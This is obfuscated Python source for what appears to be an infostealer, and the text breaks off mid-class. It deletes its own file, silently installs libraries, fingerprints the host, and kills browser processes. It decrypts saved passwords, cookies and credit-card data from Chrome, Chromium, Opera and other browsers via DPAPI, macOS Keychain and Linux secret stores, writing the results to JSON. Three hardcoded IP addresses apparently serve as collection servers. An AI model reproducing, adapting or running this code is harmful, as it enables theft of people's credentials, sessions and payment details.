import sys
sys.exit(1)

Bq='-nodel'
Bp=',./,./,./'
Bo='client_id'
Bn='%USERPROFILE%'
Bm='microsoft-edge'
Bl='google-chrome'
Bk='Brave-Browser'
Bj='User Data'
Bi='Web Data'
Bh='Network'
Bg='storeId'
Bf='session'
Be='httpOnly'
Bd='hostOnly'
Bc='expirationDate'
Bb='domain'
Ba='no_restriction'
BZ='unspecified'
BY='strict'
BX='jeepney'
BW='%SystemRoot%\\System32\\Wbem\\wmic'
BV="name='"
BU='portalocker error: '
BT='pywin32'
BS='/tmp/.pip'
BR=AttributeError
BB='spf'
BA='login-db'
B9='1Password'
B8='Edge'
B7='Microsoft Edge'
B6='bsd'
B5='%Y-%m-%d %H:%M:%S'
B4=bytes
Ao='-tt'
An='Brave'
Am='Chrome'
Al='secretstorage'
Ak='rb'
Aj='get'
Ai='useraccount'
Ah='-pip'
Ag=enumerate
Af=ValueError
AX='Bitwarden'
AW='NordPass'
AV='Dashlane'
AU='\\AppData\\Local\\Application Data\\'
AT='/AppData/Local/Application Data/'
AS='cygwin'
AR='sameSite'
AQ='value'
AP=' Profile'
AO='Profile '
AN='Default'
AM=hasattr
AL=isinstance
AK=print
AC='secure'
AB='linux'
AA='name'
A9=staticmethod
A8=list
z=b''
y='sid'
u='\n'
t=int
m='darwin'
j='utf-8'
i='path'
V='w'
S=RuntimeError
R=open
O='win32'
M=len
L=str
I=''
H=False
G=Exception
E=None
D=True
import sys as F,subprocess as T,os as A,platform as Br,socket,getpass as BC,uuid,traceback as W
from sys import argv as K
import datetime as n,json as e,base64 as AY,glob as B,shutil as v,tempfile as Bs,time as AZ,threading as Bt,re,hashlib as k,sqlite3 as AD
from pathlib import Path as AE
if F.platform==O:import ctypes as J;from ctypes import wintypes as P
else:F.path.append(BS)
if K[0]=='-c':Ap=D;f=H
else:
	Ap=H;Bu=A.path.basename(K[0]);f=Bu=='1.py'
	if f==H:
		try:A.remove(K[0]);AK(f"deleted: {K[0]}")
		except G as N:AK(f"Failed to delete: {K[0]}: {N}")
o=f or'--debug'in K
if'-v4'in K:Aq='A4'
elif'-v5'in K:Aq='A5'
else:Aq='0'
p=getattr(F,'_v1',E)
if not p:p=A.getenv('_V',E)
if not p:p=Aq
BD=p.split('-')[0]
g=getattr(F,'_v2',E)
if'-v4'in K or BD=='A4':A0='http://136.0.9.8:27017';Ar='7699029999'
elif'-v5'in K or BD=='A5':A0='http://23.27.202.27:27017';Ar='7609033774'
else:A0='http://166.88.4.2:27017';Ar='-4697384025'
As=socket.gethostname()
A1=BC.getuser()
BE=Br.platform()
At=F.executable
def C(message=I,only_debug_mode=H):
	A=message
	if not only_debug_mode or o:AK(A)
	return A
def a(lib_name):
	H='install';E='pip';A=lib_name
	try:T.check_call([At,'-m',E,H,A],stdout=T.DEVNULL,stderr=T.DEVNULL)
	except G as B:
		if F.platform==O:C(W.format_exc(),D);C(f"<ERROR> Failed to install pip:{A}: "+L(B))
		else:
			try:T.check_call([At,'-m',E,H,A,'--target',BS],stdout=T.DEVNULL,stderr=T.DEVNULL)
			except G as B:C(W.format_exc(),D);C(f"<ERROR> Failed to install pip:{A}: "+L(B))
def exit():
	if g is not E and g!=I:
		if F.platform==O:B=A.path.expandvars(f"%LOCALAPPDATA%\\Temp\\{g}")
		else:B=f"/tmp/{g}"
		with R(B,V)as C:C.write(g)
	F.exit()
if f==H or Ah in K:a('portalocker')
global Bv
try:
	if F.platform==O:BF=A.path.expandvars('%LOCALAPPDATA%\\Temp');A.makedirs(BF,exist_ok=D);BG=A.path.join(BF,'tmp7A863DD1.tmp');a(BT)
	else:BG=f"/tmp/tmp7A863DD1.tmp"
	Bw=R(BG,V);import portalocker as Aa
	try:Bv=Aa.lock(Bw,Aa.LOCK_EX|Aa.LOCK_NB)
	except Aa.exceptions.LockException as Y:C('Already running! '+L(Y));exit()
except BR as Y:C(BU+L(Y))
except ModuleNotFoundError as Y:C(BU+L(Y))
except G as Y:C('Seems already running! '+L(Y));exit()
try:BH=L(uuid.UUID(int=uuid.getnode()))
except G as Y:BH=L(Y);C(W.format_exc(),D);C(f"failed to get UUID: {Y}")
try:
	if F.platform==O:
		try:
			try:Q=T.check_output(['wmic',Ai,'where',BV+A1+"'",Aj,y],universal_newlines=D)
			except:Q=T.check_output([A.path.expandvars(BW),Ai,'where',BV+A1+"'",Aj,y],universal_newlines=D)
			Q=Q.replace(u,I).replace('SID',I).replace(' ',I).rsplit('-',1)[0]
			if not Q:
				try:Q=T.check_output(['wmic',Ai,Aj,y],universal_newlines=D)
				except:Q=T.check_output([A.path.expandvars(BW),Ai,Aj,y],universal_newlines=D)
				Q=Q.replace('SID',I).strip().split(u)[0].rsplit('-',1)[0]
				if not Q:AK(f"SID is empty, try again: {Q}");raise G('sid is empty')
		except:a(BT);import win32security as BI;Q,CD,CE=BI.LookupAccountName(E,A1);Q=BI.ConvertSidToStringSid(Q).rsplit('-',1)[0]
	else:
		try:Q=T.check_output(['system_profiler','SPHardwareDataType','|','awk',"'/UUID/ { print $3; }'"],universal_newlines=D);Ab=re.search('Hardware UUID: (.*)',Q);Q=Ab.group(1)
		except:
			Q=T.check_output(['blkid'],universal_newlines=D);Bx=Q.split(u)
			for By in Bx:
				Ab=re.findall(' UUID=\\"(.+?)\\"',By)
				if Ab:Q=Ab[0];break
except G as Y:Q=L(Y);C(W.format_exc(),D);C(f"failed to get SID: {Y}")
if f==H or Ah in K:a('requests');a('psutil');a('pyzipper')
import requests as A2,psutil as Ac,pyzipper as A3
def Au(process_name):
	E='pid';B=process_name
	if F.platform==O:
		B=B+'.exe'
		try:A.system(f"taskkill /f /im {B}")
		except G as H:pass
		return
	try:
		for D in Ac.process_iter([E,AA]):
			if D.info[AA]==B:D.kill();C(f"Killed '{B}' with PID {D.info[E]}.");D.wait(timeout=3);return
	except Ac.NoSuchProcess:pass
	except Ac.AccessDenied:C(f"Permission denied to kill process '{B}' with PID {D.info[E]}.")
	except Ac.TimeoutExpired:C(f"Process '{B}' with PID {D.info[E]} did not terminate in time.")
	except G as H:C(f"Error to kill '{B}' with PID {D.info[E]}: {H}")
def Z(source,dest):
	B=dest;A=source
	if F.platform==O:
		try:T.run(['copy',A,B,'/y'],stdout=T.DEVNULL,check=D,shell=D)
		except G as E:C(f"Error to copy '{A}' to '{B}': {E}")
	else:v.copy2(A,B)
def w(source,dest):
	C=source;B=dest
	if F.platform==O:T.run(['xcopy',C,B,'/s/e/c/i/q/h/r/y'],stdout=T.DEVNULL,check=D)
	elif F.version_info>=(3,8):v.copytree(C,B,dirs_exist_ok=D)
	else:
		if A.path.exists(B):v.rmtree(B)
		v.copytree(C,B)
def h(text,length=8):return k.md5(text.encode()).hexdigest().upper()[-length:]
def BJ(file_path,length=8):
	A=k.md5()
	with R(file_path,Ak)as B:
		for C in iter(lambda:B.read(4096),z):A.update(C)
	return A.hexdigest().upper()[-length:]
def Av(millis):
	A=millis
	if A==E or A==I:return
	return n.datetime.fromtimestamp(A,n.timezone.utc).strftime(B5)
class AF:
	def __init__(A,database_file,try_legacy_first=H):
		A.__database_file=database_file;A.__temp_file=E;A.__connection=E;A.__methods=[A.__sqlite3_connect_readonly,A.__get_connection_legacy]
		if try_legacy_first:A.__methods.reverse()
	def __enter__(A):return A.get_connection()
	def __exit__(A,exc_type,exc_value,traceback):A.close()
	def __check_connection_ok(A,connection):
		try:connection.cursor().execute('select 1 from sqlite_master');return D
		except AD.OperationalError:return H
	def __sqlite3_connect_readonly(A):
		C=AE(A.__database_file).absolute().as_uri()
		for E in('?mode=ro','?mode=ro&nolock=1','?mode=ro&immutable=1'):
			try:B=AD.connect(C+E,uri=D)
			except AD.OperationalError:continue
			if A.__check_connection_ok(B):return B
	def __get_connection_legacy(A):
		A.__temp_file=Bs.NamedTemporaryFile(suffix='.sqlite').name;v.copyfile(A.__database_file,A.__temp_file);B=AD.connect(A.__temp_file)
		if A.__check_connection_ok(B):return B
	def get_connection(A):
		if A.__connection:return A.__connection
		for C in A.__methods:
			B=C()
			if B is not E:A.__connection=B;return B
		raise S('Unable to read database file')
	def cursor(A):return A.connection().cursor()
	def close(B):
		if B.__connection:B.__connection.close()
		if B.__temp_file:
			try:A.remove(B.__temp_file)
			except G:pass
def BK(export_path,load_cookies=H,rename_cookies=H,kill_process=H):
	BA='osx_keychain';B9='v10_key';B3='Opera Safe Storage';B2='v11 keys should only appear on Linux.';B1='ignore';B0='Failed to decrypt the cipher text with DPAPI and no AES key.';A_='org.kde.KWallet';Az='/modules/kwalletd5';Ay='org.kde.kwalletd5';Ax='application';Aw='xdg:schema';At='org.freedesktop.Secret.Service';As='/org/freedesktop/secrets';Ar='org.freedesktop.secrets';Aq='APPDATA';Ac='Opera';Ab='chrome';Aa='renamed';AX='kwallet';AW='osx';AS='-beta';AK='encrypted_value';AJ='v11_key';AI='Unable to get key for decryption';AH='env';AE='chromium';A7=' SxS';A6='windows';A4=export_path;A3='Stable';A2='_error';A1=b'v11';y='osx_key_user';x='osx_key_service';w='os_crypt_name';v='windows_keys';u='osx_cookies';s='windows_cookies';r='linux_cookies';q='osx_logins';p='windows_logins';l='linux_logins';g='values';d='filename';b=' Dev';Y=' Beta'
	if f==H or Ah in K:a('pycryptodomex')
	import Cryptodome.Cipher;from Cryptodome.Util.Padding import unpad as Ad;from Cryptodome.Protocol.KDF import PBKDF2 as AG;from typing import Union
	if F.platform.startswith(AB)or B6 in F.platform.lower():
		import contextlib as Ae
		try:a(BX);import jeepney as AT;from jeepney.io.blocking import open_dbus_connection as BB;Ai=H
		except ImportError:a('dbus-python');import dbus as k;Ai=D
	AU=b'peanuts'
	class X(G):0
	def Aj(cipher_text=z,entropy=z,reserved=E,prompt_struct=E,is_key=H):
		class E(J.Structure):_fields_=[('cbData',P.DWORD),('pbData',J.POINTER(J.c_char))]
		F,G,A=map(lambda x:E(M(x),J.create_string_buffer(x)),[cipher_text,entropy,z]);B=J.c_wchar_p();H=1
		if not J.windll.crypt32.CryptUnprotectData(J.byref(F),J.byref(B),J.byref(G),reserved,prompt_struct,H,J.byref(A)):raise S('Failed to decrypt the cipher text with DPAPI')
		D=B.value;C=J.create_string_buffer(t(A.cbData));J.memmove(C,A.pbData,A.cbData);map(J.windll.kernel32.LocalFree,[B,A.pbData])
		if is_key:return D,C.raw
		else:return D,C.value
	def BC(osx_key_service,osx_key_user):
		'Retrieve password used to encrypt cookies from OSX Keychain';B=['/usr/bin/security','-q','find-generic-password','-w','-a',osx_key_user,'-s',osx_key_service];A=T.Popen(B,stdout=T.PIPE,stderr=T.PIPE);C,D=A.communicate()
		if A.returncode!=0:return AU
		return C.strip()
	def BD(path):
		B=path
		if not AL(B,dict):B={i:B,AH:Aq}
		return A.path.join(A.getenv(B[AH],I),B[i])
	def BE(paths,os_name):
		'Expands user paths on Linux, OSX, and windows';D=os_name;C=paths;D=D.lower();assert D in[A6,AW,AB]
		if not AL(C,A8):C=[C]
		if D==A6:C=map(BD,C)
		else:C=map(A.path.expanduser,C)
		for E in C:
			for F in sorted(B.glob(E)):yield F
	def A0(paths,os_name):return A8(BE(paths,os_name))
	def Ao(paths,channel=E):
		B=paths;A=channel;A=A or[I]
		if not AL(A,A8):A=[A]
		if not AL(B,A8):B=[B]
		return B,A
	def U(paths,channel=E):
		'Generate paths for chromium based browsers on *nix systems.';B=channel;A=paths;A,B=Ao(A,B);C=[]
		for D in B:
			for E in A:C.append(E.format(channel=D))
		return C
	def N(paths,channel=E):
		'Generate paths for chromium based browsers on windows';B=channel;A=paths;A,B=Ao(A,B);C=[]
		for D in B:
			for E in A:C.append({AH:'LOCALAPPDATA',i:E.format(channel=D)});C.append({AH:Aq,i:E.format(channel=D)})
		return C
	def AV(data):
		try:return data.decode(j)
		except UnicodeDecodeError:return data
	class Ap:
		def __init__(A,object_path,bus_name,interface):A.__dbus_address=AT.DBusAddress(object_path,bus_name,interface)
		def __enter__(A):A.__connection=BB();return A
		def __exit__(A,exc_type,exc_value,traceback):A.__connection.close()
		def close(A):A.__connection.close()
		def call_method(B,method_name,signature=E,*C):
			D=AT.new_method_call(B.__dbus_address,method_name,signature,C);A=B.__connection.send_and_get_reply(D)
			if A.header.message_type==AT.MessageType.error:raise S(A.body[0])
			return A.body[0]if M(A.body)==1 else A.body
	class BF:
		'Retrieve password used to encrypt cookies from KDE Wallet or SecretService';_APP_ID='browser-cookie3'
		def __init__(A,use_dbus):
			if use_dbus:A.__methods_map={AX:A.__get_kdewallet_password_dbus,Al:A.__get_secretstorage_item_dbus}
			else:A.__methods_map={AX:A.__get_kdewallet_password_jeepney,Al:A.__get_secretstorage_item_jeepney}
		def get_password(A,os_crypt_name):
			B=os_crypt_name
			try:return A.__get_secretstorage_password(B)
			except S:pass
			try:return A.__methods_map.get(AX)(B)
			except S:pass
			return AU
		def __get_secretstorage_password(B,os_crypt_name):
			A=os_crypt_name;C=['chrome_libsecret_os_crypt_password_v2','chrome_libsecret_os_crypt_password_v1']
			for D in C:
				try:return B.__methods_map.get(Al)(D,A)
				except S:pass
			raise S(f"Can not find secret for {A}")
		def __get_secretstorage_item_dbus(J,schema,application):
			D=application
			with Ae.closing(k.SessionBus())as E:
				try:B=k.Interface(E.get_object(Ar,As,H),At)
				except k.exceptions.DBusException:raise S('The name org.freedesktop.secrets was not provided by any .service files')
				A=B.SearchItems({Aw:schema,Ax:D});A=A8(filter(lambda x:M(x),A))
				if M(A)==0:raise S(f"Can not find secret for {D}")
				A=A[0][0];B.Unlock([A]);C,F=B.OpenSession('plain',k.String(I,variant_level=1));C,C,G,C=B.GetSecrets([A],F)[A];return B4(G)
		def __get_kdewallet_password_dbus(B,os_crypt_name):
			E=os_crypt_name;D=f"{E.capitalize()} Keys";F=f"{E.capitalize()} Safe Storage"
			with Ae.closing(k.SessionBus())as G:
				try:I=G.get_object(Ay,Az,H)
				except k.exceptions.DBusException:raise S('The name org.kde.kwalletd5 was not provided by any .service files')
				A=k.Interface(I,A_);C=A.open(A.networkWallet(),k.Int64(0),B._APP_ID)
				if not A.hasFolder(C,D,B._APP_ID):A.close(C,H,B._APP_ID);raise S(f"KDE Wallet folder {D} not found.")
				J=A.readPassword(C,D,F,B._APP_ID);A.close(C,H,B._APP_ID);return J.encode(j)
		def __get_secretstorage_item_jeepney(H,schema,application):
			D=application;E=[As,Ar,At]
			with Ap(*E)as B:
				A=B.call_method('SearchItems','a{ss}',{Aw:schema,Ax:D});A=A8(filter(lambda x:M(x),A))
				if M(A)==0:raise S(f"Can not find secret for {D}")
				A=A[0][0];B.call_method('Unlock','ao',[A]);C,F=B.call_method('OpenSession','sv','plain',('s',I));C,C,G,C=B.call_method('GetSecrets','aoo',[A],F)[A];return G
		def __get_kdewallet_password_jeepney(B,os_crypt_name):
			G='ibs';F='close';E=os_crypt_name;D=f"{E.capitalize()} Keys";I=f"{E.capitalize()} Safe Storage"
			with Ap(Az,Ay,A_)as A:
				J=A.call_method('networkWallet');C=A.call_method('open','sxs',J,0,B._APP_ID);K=A.call_method('hasFolder','iss',C,D,B._APP_ID)
				if not K:A.call_method(F,G,C,H,B._APP_ID);raise S(f"KDE Wallet folder {D} not found.")
				L=A.call_method('readPassword','isss',C,D,I,B._APP_ID);A.call_method(F,G,C,H,B._APP_ID);return L.encode(j)
	class c:
		'Super class for all Chromium based browsers';UNIX_TO_NT_EPOCH_OFFSET=11644473600
		def __init__(A,browser_name,process_name,login_files=E,cookie_files=E,key_files=E,**B):A.salt=b'saltysalt';A.iv=b' '*16;A.length=16;A.browser_name=browser_name;A.process_name=process_name;A.login_files=login_files;A.cookie_files=cookie_files;A.key_files=key_files;A.__add_key_and_data_files(**B)
		def __add_key_and_data_files(A,linux_logins=E,windows_logins=E,osx_logins=E,linux_cookies=E,windows_cookies=E,osx_cookies=E,windows_keys=E,os_crypt_name=E,osx_key_service=E,osx_key_user=E):
			if F.platform==m:B=1003;H=BC(osx_key_service,osx_key_user);A.osx_keychain=H;A.v10_key=AG(H,A.salt,A.length,B);C=A.login_files or A0(osx_logins,AW);G=A.cookie_files or A0(osx_cookies,AW)
			elif F.platform.startswith(AB)or B6 in F.platform.lower():H=BF(Ai).get_password(os_crypt_name);B=1;A.v10_key=AG(AU,A.salt,A.length,B);A.v11_key=AG(H,A.salt,A.length,B);A.v11_empty_key=AG(z,A.salt,A.length,B);C=A.login_files or A0(linux_logins,AB);G=A.cookie_files or A0(linux_cookies,AB)
			elif F.platform==O:
				I=A.key_files or A0(windows_keys,A6)
				if I:
					A.key_files=I
					with R(I[0],Ak)as J:K=e.load(J);L=K['os_crypt']['encrypted_key'].encode(j);M=AY.standard_b64decode(L)[5:];N,A.v10_key=Aj(M,is_key=D)
				else:A.v10_key=E
				C=A.login_files;G=A.cookie_files
				if not C:C=A0(windows_logins,A6)
				if not G:G=A0(windows_cookies,A6)
			else:raise S(f"OS not recognized: {F.platform}")
			A.cookie_files=G;A.login_files=C
		@A9
		def _decrypt_windows_chromium(value,encrypted_value):
			B=encrypted_value;A=value
			if M(A)!=0:return A
			if B==z:return I
			D,C=Aj(B);assert AL(C,B4);return C.decode()
		def _decrypt(B,value,encrypted_value):
			C=value;A=encrypted_value
			if F.platform==O:
				try:return B._decrypt_windows_chromium(C,A)
				except S:
					if not B.v10_key:raise X(B0)
					A=A[3:];D,E=A[:12],A[-16:];G=Cryptodome.Cipher.AES.new(B.v10_key,Cryptodome.Cipher.AES.MODE_GCM,nonce=D)
					try:H=G.decrypt_and_verify(A[12:-16],E)
					except Af:raise X(AI)
					return H.decode(errors=B1)
			if C or A[:3]not in[A1,b'v10']:return C
			if not AM(B,AJ):assert A[:3]!=A1,B2
			I=(B.v11_key,B.v11_empty_key)if A[:3]==A1 else(B.v10_key,);A=A[3:]
			for J in I:
				K=Cryptodome.Cipher.AES.new(J,Cryptodome.Cipher.AES.MODE_CBC,B.iv)
				try:L=Ad(K.decrypt(A),Cryptodome.Cipher.AES.block_size);return L.decode(j)
				except Af:pass
			raise X(AI)
		def _decrypt_cookie24(B,value,encrypted_value):
			C=value;A=encrypted_value
			if F.platform==O:
				if not B.v10_key:raise X(B0)
				A=A[3:];D,E=A[:12],A[-16:];G=Cryptodome.Cipher.AES.new(B.v10_key,Cryptodome.Cipher.AES.MODE_GCM,nonce=D)
				try:H=G.decrypt_and_verify(A[12:-16],E)
				except Af:raise X(AI)
				return H.decode(errors=B1)
			if C or A[:3]not in[A1,b'v10']:return C
			if not AM(B,AJ):assert A[:3]!=A1,B2
			I=(B.v11_key,B.v11_empty_key)if A[:3]==A1 else(B.v10_key,);A=A[3:]
			for J in I:
				K=Cryptodome.Cipher.AES.new(J,Cryptodome.Cipher.AES.MODE_CBC,B.iv)
				try:L=Ad(K.decrypt(A)[32:],Cryptodome.Cipher.AES.block_size);return L.decode(j)
				except Af:pass
			raise X(AI)
		@A9
		def convert_chrome_time(chrome_time):return(n.datetime(1601,1,1)+n.timedelta(microseconds=chrome_time)).strftime(B5)
		def export_passwords(B):
			R='date_last_used';Q='date_created';K='password_value';N=[]
			for E in B.login_files:
				F={d:E}
				try:
					with AF(E)as O:
						O.text_factory=AV;J=O.cursor();J.execute('SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created');P=[];S=[A[0]for A in J.description]
						for T in J.fetchall():
							A={}
							for(U,V)in Ag(S):A[V]=T[U]
							A[K]=B._decrypt(I,A[K]);A[Q]=B.convert_chrome_time(A[Q]);A[R]=B.convert_chrome_time(A[R])
							if M(A[K])>0:P.append(A)
						F[g]=P
				except X as H:
					if o:C(f"failed to get passwords from {E}: {H}",D);F[A2]=W.format_exc()
				except G as H:
					if'no such table: logins'in L(H):continue
					if o:C(f"failed to get passwords from {E}: {H}",D);F[A2]=W.format_exc()
				N.append(F)
			return N
		def export_passwords_to_file(G,export_path):
			H=export_path;I=G.export_passwords()
			if M(I)==0:return
			A.makedirs(H,exist_ok=D)
			for C in I:
				E=C[d];del C[d]
				if g in C:F=C[g]
				else:F=C
				if M(F)==0:continue
				J=A.path.dirname(E);B=A.path.basename(J)
				if B==AN:B=0
				elif B.startswith(AO):B=B[8:]
				elif B.endswith(AP):B=B[:-8]
				E=A.path.join(H,f"login-{G.browser_name}-{B}-{h(J)}.json")
				with R(E,V)as K:K.write(e.dumps(F,indent=4))
		def export_cookies(K,rename_cookie=H):
			R=[]
			for B in K.cookie_files:
				P=rename_cookie;E=f"{B}~{t(AZ.time())}"
				try:Z(B,E)
				except:C(f"failed to create a copied cookie file: {E}",D);E=B
				J={d:B}
				try:
					with AF(E)as S:
						S.text_factory=AV;L=S.cursor();M=0
						try:
							N=L.execute("select value from meta where key = 'version';").fetchone()
							if N:M=t(N[0])
							else:C('cookie database version not found in meta table')
						except AD.OperationalError:C('cookie database is missing meta table')
						if F.platform==O and M>=24:raise X(f"win32_cookie_database_version = {M}")
						L.execute('SELECT * FROM cookies');T=[];U=[A[0]for A in L.description]
						for N in L.fetchall():
							I={}
							for(V,Y)in Ag(U):I[Y]=N[V]
							I[AK]=K._decrypt(I[AQ],I[AK])if M<24 else K._decrypt_cookie24(I[AQ],I[AK]);T.append(I)
						J[g]=T
				except X as Q:
					P=H
					if o:C(f"failed to get cookies from {B}: {Q}",D);J[A2]=W.format_exc()
				except G as Q:
					P=H
					if o:C(f"failed to get cookies from {B}: {Q}",D);J[A2]=W.format_exc()
				if P:
					try:A.remove(B);C(f"Cookie file renamed to {E}");J[Aa]=D
					except:C(f"failed to delete original cookie file: {K.cookies_file}")
				elif E!=B:
					try:A.remove(E)
					except:C(f"failed to delete copied cookie file: {E}")
				R.append(J)
			return R
		def export_cookies_to_file(L,export_path,rename_cookie=H):
			X='is_secure';W='expires_utc';P=export_path;O='samesite';Q=L.export_cookies(rename_cookie)
			if M(Q)==0:return
			A.makedirs(P,exist_ok=D)
			for G in Q:
				Y=G[d];del G[d]
				if g in G:
					J=[]
					for B in G[g]:
						S=B['host_key']
						if B[W]==0:T=E
						else:T=B[W]/1000000-c.UNIX_TO_NT_EPOCH_OFFSET
						Z=S[0]!='.';a=B['is_httponly']!=0;b=B[AA];f=B[i]
						if B[O]==1:K='lax'
						elif B[O]==2:K=BY
						elif B[O]==-1:K=BZ
						else:K=Ba
						if X in B:U=B[X]!=0
						elif AC in B:U=B[AC]!=0
						j=B[AK];J.append({Bb:S,Bc:T,Bd:Z,Be:a,AA:b,i:f,AR:K,AC:U,Bf:H,Bg:'0',AQ:j})
				else:J=G
				if M(J)==0:continue
				k=Aa in G and G[Aa];I=A.path.dirname(Y)
				if A.path.basename(I)==Bh:I=A.path.dirname(I)
				F=A.path.basename(I)
				if F==AN:F=0
				elif F.startswith(AO):F=F[8:]
				elif F.endswith(AP):F=F[:-8]
				if k:N=f"cookie-{L.browser_name}-{F}-{h(I)}-re.json"
				else:N=f"cookie-{L.browser_name}-{F}-{h(I)}.json"
				with R(A.path.join(P,N),V)as l:l.write(e.dumps(J,indent=4))
				C(f"Export cookie: {I} -> {N}",D)
		def export_cards(Q):
			Z='last_updated_timestamp';Y='use_date';V='date_modified';N='value_encrypted';K='card_number_encrypted';S=[]
			for a in Q.login_files:
				H=A.path.join(A.path.dirname(a),Bi)
				if not A.path.isfile(H):continue
				P={d:H}
				try:
					with AF(H)as T:
						T.text_factory=AV;R=T.cursor();R.execute('SELECT * FROM credit_cards LEFT JOIN local_stored_cvc ON credit_cards.guid=local_stored_cvc.guid ORDER BY use_date');U=[];b=[A[0]for A in R.description]
						for c in R.fetchall():
							B={}
							for(e,f)in Ag(b):B[f]=c[e]
							if B[K]!=E and M(B[K])>0:
								if B[K][:3]==b'v20'and F.platform==O:continue
								B[K]=Q._decrypt(I,B[K])
							if B[N]!=E and M(B[N])>0:
								try:B[N]=Q._decrypt(I,B[N])
								except G as J:B[N]=L(J)
							B[V]=Av(B[V]);B[Y]=Av(B[Y]);B[Z]=Av(B[Z]);U.append(B)
						P[g]=U
				except X as J:
					if o:C(f"failed to get cards from {H}: {J}",D);P[A2]=W.format_exc()
				except G as J:
					if o:C(f"failed to get cards from {H}: {J}",D);P[A2]=W.format_exc()
				S.append(P)
			return S
		def export_cards_to_file(G,export_path):
			H=export_path;I=G.export_cards()
			if M(I)==0:return
			A.makedirs(H,exist_ok=D)
			for C in I:
				E=C[d];del C[d]
				if g in C:F=C[g]
				else:F=C
				if M(F)==0:continue
				J=A.path.dirname(E);B=A.path.basename(J)
				if B==AN:B=0
				elif B.startswith(AO):B=B[8:]
				elif B.endswith(AP):B=B[:-8]
				E=A.path.join(H,f"card-{G.browser_name}-{B}-{h(J)}.json")
				with R(E,V)as K:K.write(e.dumps(F,indent=4))
	class BG(c):
		'Class for Google Chrome'
		def __init__(C,login_files=E,cookie_files=E,key_files=E):A='-unstable';B={l:U(['~/.config/google-chrome{channel}/*/Login Data','~/.var/app/com.google.Chrome/config/google-chrome{channel}/*/Login Data'],channel=[I,AS,A]),p:N(['Google\\Chrome{channel}\\User Data*\\*\\Login Data'],channel=[I,Y,b,A7]),q:U(['~/Library/Application Support/Google/Chrome{channel}/*/Login Data'],channel=[I,Y,b]),r:U(['~/.config/google-chrome{channel}/*/Cookies','~/.var/app/com.google.Chrome/config/google-chrome{channel}/*/Cookies'],channel=[I,AS,A]),s:N(['Google\\Chrome{channel}\\User Data*\\*\\Cookies','Google\\Chrome{channel}\\User Data*\\*\\Network\\Cookies'],channel=[I,Y,b,A7]),u:U(['~/Library/Application Support/Google/Chrome{channel}/*/Cookies'],channel=[I,Y,b]),v:N('Google\\Chrome{channel}\\User Data*\\Local State',channel=[I,Y,b]),w:Ab,x:'Chrome Safe Storage',y:Am};super().__init__(browser_name=Am,process_name=Ab,login_files=login_files,cookie_files=cookie_files,key_files=key_files,**B)
	class BH(c):
		'Class for Chromium'
		def __init__(C,login_files=E,cookie_files=E,key_files=E):A='Chromium';B={l:['~/.config/chromium/*/Login Data','~/.var/app/org.chromium.Chromium/config/chromium/*/Login Data'],p:N(['Chromium\\User Data*\\*\\Login Data']),q:['~/Library/Application Support/Chromium/*/Login Data'],r:['~/.config/chromium/*/Cookies','~/.var/app/org.chromium.Chromium/config/chromium/*/Cookies'],s:N(['Chromium\\User Data*\\*\\Cookies','Chromium\\User Data*\\*\\Network\\Cookies']),u:['~/Library/Application Support/Chromium/*/Cookies'],v:N('Chromium\\User Data*\\Local State'),w:AE,x:'Chromium Safe Storage',y:A};super().__init__(browser_name=A,process_name=AE,login_files=login_files,cookie_files=cookie_files,key_files=key_files,**B)
	class BI(c):
		'Class for Opera'
		def __init__(D,login_files=E,cookie_files=E,key_files=E):B='Developer';A='Next';C={l:['~/.config/opera/Login Data','~/.config/opera-beta/Login Data','~/.config/opera-developer/Login Data','~/.var/app/com.opera.Opera/config/opera/Login Data','~/.var/app/com.opera.Opera/config/opera-beta/Login Data','~/.var/app/com.opera.Opera/config/opera-developer/Login Data','~/.config/opera/*/Login Data','~/.config/opera-beta/*/Login Data','~/.config/opera-developer/*/Login Data','~/.var/app/com.opera.Opera/config/opera/*/Login Data','~/.var/app/com.opera.Opera/config/opera-beta/*/Login Data','~/.var/app/com.opera.Opera/config/opera-developer/*/Login Data'],p:N(['Opera Software\\Opera {channel}\\Login Data','Opera Software\\Opera {channel}\\*\\Login Data','Opera Software\\Opera {channel}\\User Data*\\*\\Login Data'],channel=[A3,A,B]),q:['~/Library/Application Support/com.operasoftware.Opera/Login Data','~/Library/Application Support/com.operasoftware.OperaNext/Login Data','~/Library/Application Support/com.operasoftware.OperaDeveloper/Login Data','~/Library/Application Support/com.operasoftware.Opera/*/Login Data','~/Library/Application Support/com.operasoftware.OperaNext/*/Login Data','~/Library/Application Support/com.operasoftware.OperaDeveloper/*/Login Data'],r:['~/.config/opera/Cookies','~/.config/opera-beta/Cookies','~/.config/opera-developer/Cookies','~/.var/app/com.opera.Opera/config/opera/Cookies','~/.var/app/com.opera.Opera/config/opera-beta/Cookies','~/.var/app/com.opera.Opera/config/opera-developer/Cookies','~/.config/opera/*/Cookies','~/.config/opera-beta/*/Cookies','~/.config/opera-developer/*/Cookies','~/.var/app/com.opera.Opera/config/opera/*/Cookies','~/.var/app/com.opera.Opera/config/opera-beta/*/Cookies','~/.var/app/com.opera.Opera/config/opera-developer/*/Cookies'],s:N(['Opera Software\\Opera {channel}\\Cookies','Opera Software\\Opera {channel}\\Network\\Cookies','Opera Software\\Opera {channel}\\*\\Cookies','Opera Software\\Opera {channel}\\User Data*\\*\\Cookies'],channel=[A3,A,B]),u:['~/Library/Application Support/com.operasoftware.Opera/Cookies','~/Library/Application Support/com.operasoftware.OperaNext/Cookies','~/Library/Application Support/com.operasoftware.OperaDeveloper/Cookies','~/Library/Application Support/com.operasoftware.Opera/*/Cookies','~/Library/Application Support/com.operasoftware.OperaNext/*/Cookies','~/Library/Application Support/com.operasoftware.OperaDeveloper/*/Cookies'],v:N('Opera Software\\Opera {channel}\\Local State',channel=[A3,A,B]),w:AE,x:B3,y:Ac};super().__init__(browser_name=Ac,process_name='opera',login_files=login_files,cookie_files=cookie_files,key_files=key_files,**C)
	class BJ(c):
		'Class for Opera GX'
		def __init__(B,login_files=E,cookie_files=E,key_files=E):A={l:[],p:N(['Opera Software\\Opera GX {channel}\\Login Data'],channel=[A3]),q:['~/Library/Application Support/com.operasoftware.OperaGX/Login Data'],r:[],s:N(['Opera Software\\Opera GX {channel}\\Cookies','Opera Software\\Opera GX {channel}\\Network\\Cookies'],channel=[A3]),u:['~/Library/Application Support/com.operasoftware.OperaGX/Cookies'],v:N('Opera Software\\Opera GX {channel}\\Local State',channel=[A3]),w:AE,x:B3,y:Ac};super().__init__(browser_name='Opera GX',process_name='opera_gx',login_files=login_files,cookie_files=cookie_files,key_files=key_files,**A)
	class BK(c):
